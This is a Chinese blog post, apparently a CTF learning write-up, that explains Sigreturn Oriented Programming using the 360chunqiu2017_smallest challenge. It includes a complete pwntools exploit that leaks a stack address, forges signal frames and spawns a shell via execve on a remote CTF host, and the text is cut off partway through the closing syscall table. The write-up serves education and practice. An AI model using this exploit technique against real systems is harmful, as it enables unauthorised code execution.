<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>360chunqiu2017_smallest —— 从例题理解SROP | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>360chunqiu2017_smallest —— 从例题理解SROP</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-08-28T16:41:50.000Z" id="date"> 2021-08-29</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:35.010Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>        本篇博客为个人学习过程中的理解，仅记录个人理解，WIKI写的要比本篇详细得多。若与其存在矛盾，请以WIKI为准，也感谢读者指出问题。</p>
<h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p>        SROP(Sigreturn Oriented Programming)，与常规ROP的区别在于通过<strong>sigreturn函数</strong>来进行返回而不是<strong>retn指令</strong></p>
<p>这里引用WIKI中对Signal机制的介绍：     </p>
<h2 id="Signal-机制-¶"><a href="#Signal-机制-¶" class="headerlink" title="Signal 机制 ¶"></a>Signal 机制 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#signal">¶</a></h2><p>Signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/img_convert/ededd27f94b4a840e0dd0cdd292257b3.png'><img src="https://img-blog.csdnimg.cn/img_convert/ededd27f94b4a840e0dd0cdd292257b3.png" alt="Process of Signal Handlering">​<img src="blob:https://tokameine.top/10147c71-499a-4800-a8f3-f07cf85ea65d"></p>
<ol>
<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。 <img src="https://img-blog.csdnimg.cn/img_convert/2f2fc8ace3056015161e320068f5c454.png" alt="signal2-stack">​ <img src="blob:https://tokameine.top/241e039b-29ba-4443-a291-e93795f73bf9"></li>
</ol>
<p><strong>如下是笔者对上述内容的翻译：</strong></p>
<p>        控制流在内核与用户层间切换时使用Signal机制来保存<strong>寄存器状态(笔者认为对上下文的保存主要依托RIP寄存器。在返回上下文时恢复RIP寄存器值来回到程序代码段，但目前并不能断言)</strong></p>
<p>        常见的场景是syscall指令执行，控制流切换入内核层，然后使用sigreturn内核函数返回用户层</p>
<p>        笔者目前还不能对内核进行调试，因此进入内核层时的堆栈状态暂时不可见，因此目前只是根据推测和一些资料来理解</p>
<p> <strong>如下为sigcontext结构：</strong></p>
<ul>
<li><strong>X86：</strong> <code>struct sigcontext &#123; unsigned short gs, __gsh; unsigned short fs, __fsh; unsigned short es, __esh; unsigned short ds, __dsh; unsigned long edi; unsigned long esi; unsigned long ebp; unsigned long esp; unsigned long ebx; unsigned long edx; unsigned long ecx; unsigned long eax; unsigned long trapno; unsigned long err; unsigned long eip; unsigned short cs, __csh; unsigned long eflags; unsigned long esp_at_signal; unsigned short ss, __ssh; struct _fpstate * fpstate; unsigned long oldmask; unsigned long cr2; &#125;;</code class='item-img' data-src='blob:https://tokameine.top/16244387-9c78-46ed-80bd-ed83df8b367d'><img src="blob:https://tokameine.top/16244387-9c78-46ed-80bd-ed83df8b367d"></li>
<li>**X64：0xf8 byte ** <code>struct _fpstate &#123; /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd; __uint16_t swd; __uint16_t ftw; __uint16_t fop; __uint64_t rip; __uint64_t rdp; __uint32_t mxcsr; __uint32_t mxcr_mask; struct _fpxreg _st[8]; struct _xmmreg _xmm[16]; __uint32_t padding[24]; &#125;; struct sigcontext &#123; __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union &#123; struct _fpstate * fpstate; __uint64_t __fpstate_word; &#125;; __uint64_t __reserved1 [8]; &#125;;</code class='item-img' data-src='blob:https://tokameine.top/92158be5-160e-4615-a129-c1753b7eaa9e'><img src="blob:https://tokameine.top/92158be5-160e-4615-a129-c1753b7eaa9e"></li>
</ul>
<p>        在切换入内核层时，将把sigcontext结构体入栈，而在返回时则又会把占中的这些数据重新pop回寄存器</p>
<p>        SROP的核心思想就是，在攻击者能够向栈中写足够字节时，通过伪造sigcontext来控制寄存器值，再通过syscall来实现任意系统调用执行(系统调用号置于文末以供参考)</p>
<p><strong>下图引用自CTF-WIKI：</strong></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/img_convert/d0323db5befc71fdb69492997f8ef95e.png'><img src="https://img-blog.csdnimg.cn/img_convert/d0323db5befc71fdb69492997f8ef95e.png" alt="signal2-stack">​<img src="blob:https://tokameine.top/1fa81cc1-8d71-4464-a001-af331a729488"></p>
<p>        该利用称为system call chains</p>
<p>        只要能够控制sigcontext且调用sigreturn，就能够控制所有寄存器的值，由此实现完全控制了(不过像“&#x2F;bin&#x2F;sh”这样的字符串需要额外写入到其他地方)</p>
<h3 id="例题：360chunqiu2017-smallest"><a href="#例题：360chunqiu2017-smallest" class="headerlink" title="例题：360chunqiu2017_smallest"></a>例题：360chunqiu2017_smallest</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    No RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/37a32ed2-c851-4af2-bfaa-1ac754790cca'><img src="blob:https://tokameine.top/37a32ed2-c851-4af2-bfaa-1ac754790cca"></p>
<p>        整个程序只有一个start函数，而整个函数也只有这几行汇编指令，存在明显的栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:00000000004000B0                 public start<br>.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o<br>.text:00000000004000B0                 xor     rax, rax<br>.text:00000000004000B3                 mov     edx, 400h       ; count<br>.text:00000000004000B8                 mov     rsi, rsp        ; buf<br>.text:00000000004000BB                 mov     rdi, rax        ; fd<br>.text:00000000004000BE                 syscall                 ; LINUX - sys_read<br>.text:00000000004000C0                 retn<br>.text:00000000004000C0 start           endp<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/3ac4329e-115a-4767-ab1e-03381d40a33d'><img src="blob:https://tokameine.top/3ac4329e-115a-4767-ab1e-03381d40a33d"></p>
<p>        没有canary保护，所以栈上基本能够任意写了。不过虽然没有RELRO保护，但因为程序根本就没有GOT表，所以也没办法使用system，只能通过execve(“&#x2F;bin&#x2F;sh”,0,0)来拿shell</p>
<p>        首先需要leak一个地址，否则在之后无法计算出“&#x2F;bin&#x2F;sh”字符串的地址</p>
<p>        标准的文件描述符如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0—stdin，标准输入流<br>1—stdout，标准输出流<br>2—stderr，标准错误流<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7db02dc3-aa60-4009-8973-5902ba979e53'><img src="blob:https://tokameine.top/7db02dc3-aa60-4009-8973-5902ba979e53"></p>
<p>        需要使用write(1,stack,n)来泄露栈上内容，阅读汇编函数能够发现，我们唯一需要控制的寄存器就是rax，当其为1时，rdi也正好能够为标准输出流，且系统调用号对应write函数，将直接从rsp出写出0x400个字节的数据</p>
<p>        可以通过read函数的返回值来控制rax为1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">start_addr = 0x00000000004000B0<br>payload=p64(start_addr)*3<br>p.send(payload)<br>p.send(&quot;\xb3&quot;)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/0c88ae62-8a08-4e26-8da8-b0c924607bca'><img src="blob:https://tokameine.top/0c88ae62-8a08-4e26-8da8-b0c924607bca"></p>
<p>        最后一行将返回地址该为0x4000B3绕过了rax置零的操作，然后调用syscall自然就会泄露地址，然后重新返回到start函数地址</p>
<p>        剩下的内容直接阅读exp注释更加方便：如下exp来自wiki（有修改）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>small = ELF(&#x27;./smallest&#x27;)<br><br>#sh = process(&#x27;./smallest&#x27;)<br>sh = remote(&quot;node4.buuoj.cn&quot;,28338)<br>context.arch = &#x27;amd64&#x27;<br>context.log_level = &#x27;debug&#x27;<br>syscall_ret = 0x00000000004000BE<br>start_addr = 0x00000000004000B0<br>## set start addr three times<br>payload = p64(start_addr) * 3<br>sh.send(payload)<br>yes = raw_input()<br>## modify the return addr to start_addr+3<br>## so that skip the xor rax,rax; then the rax=1<br>## get stack addr<br>sh.send(&#x27;\xb3&#x27;)<br>yes = raw_input()<br>stack_addr = u64(sh.recv()[8:16])<br>stack_addr = stack_addr&amp;0xfffffffffffffff000<br>stack_addr -=0x2000<br>log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))<br> <br>## make the rsp point to stack_addr<br>## the frame is read(0,stack_addr,0x400)<br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_read<br>sigframe.rdi = 0<br>sigframe.rsi = stack_addr<br>sigframe.rdx = 0x400<br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br>payload = p64(start_addr) + &#x27;a&#x27; * 8 + str(sigframe)<br>sh.send(payload)<br>yes = raw_input()<br>## set rax=15 and call sigreturn<br>sigreturn = p64(syscall_ret) + &#x27;b&#x27; * 7<br>sh.send(sigreturn)<br>yes = raw_input()<br>## call execv(&quot;/bin/sh&quot;,0,0)<br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + 0x190  # &quot;/bin/sh&quot; &#x27;s addr<br>sigframe.rsi = 0x0<br>sigframe.rdx = 0x0<br>sigframe.rsp = stack_addr+ 0x190<br>sigframe.rip = syscall_ret<br> <br><br>retadd=0x4000C0 <br>frame_payload = p64(start_addr) + &#x27;b&#x27; * 8 + str(sigframe)<br>print len(frame_payload)<br>payload = frame_payload + (0x190 - len(frame_payload)) * &#x27;\x00&#x27; + &#x27;/bin/sh\x00&#x27;+p64(stack_addr + 0x190)<br>sh.send(payload)<br>yes = raw_input()<br>sh.send(sigreturn)<br>yes = raw_input()<br>sh.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/c58d495b-4df2-419b-b4a2-ad6175076379'><img src="blob:https://tokameine.top/c58d495b-4df2-419b-b4a2-ad6175076379"></p>
<p>        有些特殊的，笔者发现WIKI原本的exp是没办法在BUU的环境里通过的，查阅后发现似乎是因为过快的发送速度会导致read返回的值出现波动，于是使用raw_input()l在每个发送数据后断开以保证其有正确的值，然后就能通过了  </p>
<h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#ifndef _ASM_X86_UNISTD_32_H<br>#define _ASM_X86_UNISTD_32_H 1<br><br>#define __NR_restart_syscall 0<br>#define __NR_exit 1<br>#define __NR_fork 2<br>#define __NR_read 3<br>#define __NR_write 4<br>#define __NR_open 5<br>#define __NR_close 6<br>#define __NR_waitpid 7<br>#define __NR_creat 8<br>#define __NR_link 9<br>#define __NR_unlink 10<br>#define __NR_execve 11<br>#define __NR_chdir 12<br>#define __NR_time 13<br>#define __NR_mknod 14<br>#define __NR_chmod 15<br>#define __NR_lchown 16<br>#define __NR_break 17<br>#define __NR_oldstat 18<br>#define __NR_lseek 19<br>#define __NR_getpid 20<br>#define __NR_mount 21<br>#define __NR_umount 22<br>#define __NR_setuid 23<br>#define __NR_getuid 24<br>#define __NR_stime 25<br>#define __NR_ptrace 26<br>#define __NR_alarm 27<br>#define __NR_oldfstat 28<br>#define __NR_pause 29<br>#define __NR_utime 30<br>#define __NR_stty 31<br>#define __NR_gtty 32<br>#define __NR_access 33<br>#define __NR_nice 34<br>#define __NR_ftime 35<br>#define __NR_sync 36<br>#define __NR_kill 37<br>#define __NR_rename 38<br>#define __NR_mkdir 39<br>#define __NR_rmdir 40<br>#define __NR_dup 41<br>#define __NR_pipe 42<br>#define __NR_times 43<br>#define __NR_prof 44<br>#define __NR_brk 45<br>#define __NR_setgid 46<br>#define __NR_getgid 47<br>#define __NR_signal 48<br>#define __NR_geteuid 49<br>#define __NR_getegid 50<br>#define __NR_acct 51<br>#define __NR_umount2 52<br>#define __NR_lock 53<br>#define __NR_ioctl 54<br>#define __NR_fcntl 55<br>#define __NR_mpx 56<br>#define __NR_setpgid 57<br>#define __NR_ulimit 58<br>#define __NR_oldolduname 59<br>#define __NR_umask 60<br>#define __NR_chroot 61<br>#define __NR_ustat 62<br>#define __NR_dup2 63<br>#define __NR_getppid 64<br>#define __NR_getpgrp 65<br>#define __NR_setsid 66<br>#define __NR_sigaction 67<br>#define __NR_sgetmask 68<br>#define __NR_ssetmask 69<br>#define __NR_setreuid 70<br>#define __NR_setregid 71<br>#define __NR_sigsuspend 72<br>#define __NR_sigpending 73<br>#define __NR_sethostname 74<br>#define __NR_setrlimit 75<br>#define __NR_getrlimit 76<br>#define __NR_getrusage 77<br>#define __NR_gettimeofday 78<br>#define __NR_settimeofday 79<br>#define __NR_getgroups 80<br>#define __NR_setgroups 81<br>#define __NR_select 82<br>#define __NR_symlink 83<br>#define __NR_oldlstat 84<br>#define __NR_readlink 85<br>#define __NR_uselib 86<br>#define __NR_swapon 87<br>#define __NR_reboot 88<br>#define __NR_readdir 89<br>#define __NR_mmap 90<br>#define __NR_munmap 91<br>#define __NR_truncate 92<br>#define __NR_ftruncate 93<br>#define __NR_fchmod 94<br>#define __NR_fchown 95<br>#define __NR_getpriority 96<br>#define __NR_setpriority 97<br>#define __NR_profil 98<br>#define __NR_statfs 99<br>#define __NR_fstatfs 100<br>#define __NR_ioperm 101<br>#define __NR_socketcall 102<br>#define __NR_syslog 103<br>#define __NR_setitimer 104<br>#define __NR_getitimer 105<br>#define __NR_stat 106<br>#define __NR_lstat 107<br>#define __NR_fstat 108<br>#define __NR_olduname 109<br>#define __NR_iopl 110<br>#define __NR_vhangup 111<br>#define __NR_idle 112<br>#define __NR_vm86old 113<br>#define __NR_wait4 114<br>#define __NR_swapoff 115<br>#define __NR_sysinfo 116<br>#define __NR_ipc 117<br>#define __NR_fsync 118<br>#define __NR_sigreturn 119<br>#define __NR_clone 120<br>#define __NR_setdomainname 121<br>#define __NR_uname 122<br>#define __NR_modify_ldt 123<br>#define __NR_adjtimex 124<br>#define __NR_mprotect 125<br>#define __NR_sigprocmask 126<br>#define __NR_create_module 127<br>#define __NR_init_module 128<br>#define __NR_delete_module 129<br>#define __NR_get_kernel_syms 130<br>#define __NR_quotactl 131<br>#define __NR_getpgid 132<br>#define __NR_fchdir 133<br>#define __NR_bdflush 134<br>#define __NR_sysfs 135<br>#define __NR_personality 136<br>#define __NR_afs_syscall 137<br>#define __NR_setfsuid 138<br>#define __NR_setfsgid 139<br>#define __NR__llseek 140<br>#define __NR_getdents 141<br>#define __NR__newselect 142<br>#define __NR_flock 143<br>#define __NR_msync 144<br>#define __NR_readv 145<br>#define __NR_writev 146<br>#define __NR_getsid 147<br>#define __NR_fdatasync 148<br>#define __NR__sysctl 149<br>#define __NR_mlock 150<br>#define __NR_munlock 151<br>#define __NR_mlockall 152<br>#define __NR_munlockall 153<br>#define __NR_sched_setparam 154<br>#define __NR_sched_getparam 155<br>#define __NR_sched_setscheduler 156<br>#define __NR_sched_getscheduler 157<br>#define __NR_sched_yield 158<br>#define __NR_sched_get_priority_max 159<br>#define __NR_sched_get_priority_min 160<br>#define __NR_sched_rr_get_interval 161<br>#define __NR_nanosleep 162<br>#define __NR_mremap 163<br>#define __NR_setresuid 164<br>#define __NR_getresuid 165<br>#define __NR_vm86 166<br>#define __NR_query_module 167<br>#define __NR_poll 168<br>#define __NR_nfsservctl 169<br>#define __NR_setresgid 170<br>#define __NR_getresgid 171<br>#define __NR_prctl 172<br>#define __NR_rt_sigreturn 173<br>#define __NR_rt_sigaction 174<br>#define __NR_rt_sigprocmask 175<br>#define 